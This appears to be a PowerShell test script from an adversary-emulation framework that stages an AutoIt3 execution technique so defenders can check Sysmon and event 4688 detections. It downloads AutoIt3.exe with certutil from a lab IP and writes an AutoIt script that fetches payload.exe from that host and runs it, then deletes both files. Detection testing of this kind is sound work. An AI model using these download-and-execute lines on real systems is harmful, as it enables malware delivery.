# CADRE — WT067 — AutoIt3 Execution
. ..\windows\lib\cadre-env.ps1
. ..\windows\lib\common.ps1
print_banner "WT067 - AutoIt3 Execution"
start_attack "067" "AutoIt3 Execution"
step "Download AutoIt3 from provisioning VM"
run_cmd "certutil -urlcache -split -f http://192.168.77.60:8081/AutoIt3.exe C:\Windows\Temp\AutoIt3.exe"
step "Create evil.au3 script"
@'
$url = "http://192.168.77.60:8081/payload.exe"
$local = @TempDir & "\payload.exe"
InetGet($url, $local)
Run($local)
'@ | Out-File C:\Windows\Temp\evil.au3 -Encoding ascii
run_cmd "Write-Host '  Staged: AutoIt3.exe + evil.au3'"
step "Clean up"
run_cmd "Remove-Item C:\Windows\Temp\AutoIt3.exe, C:\Windows\Temp\evil.au3 -Force -ErrorAction SilentlyContinue"
result 0 "WT067 — check Sysmon EID 1 (AutoIt3.exe), 4688"
